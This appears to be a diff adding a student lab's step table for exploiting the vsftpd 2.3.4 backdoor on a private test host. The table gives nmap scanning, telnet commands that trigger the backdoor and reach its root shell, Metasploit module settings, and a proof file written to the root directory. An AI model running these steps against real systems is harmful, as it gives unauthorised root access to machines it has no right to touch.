@@ -1,0 +1,11 @@
+Attack steps  				Program   		Command
+1. Identify service version		nmapsudo 		nmap -sV -p 21 10.30.0.235
+2. Trigger backdoor manually		telnet			telnet 10.30.0.235 21 (Then type: USER frankie:) and PASS 123)
+3. Verify interactive root shell	telnet			telnet 10.30.0.235 6200 (Then type: whoami and id)
+4. Initialize exploit database		bash			sudo msfdb init && msfconsole
+5. Load specific exploit module		msfconsole		use exploit/unix/ftp/vsftpd_234_backdoor
+6. Configure remote target IP		msfconsole		set RHOSTS 10.30.0.235
+7. Launch automated exploitation	msfconsole		exploit
+8. Confirm administrative privileges	msfconsole		whoami
+9. Generate proof of exploit file	msfconsole		echo "I ElonFrankie have completed exploiting vsftpd using a script." > /ElonFrankie_vsftpd.txt
+10. Verify artifact and capture screenshot	msfconsole	cat /ElonFrankie_vsftpd.txt
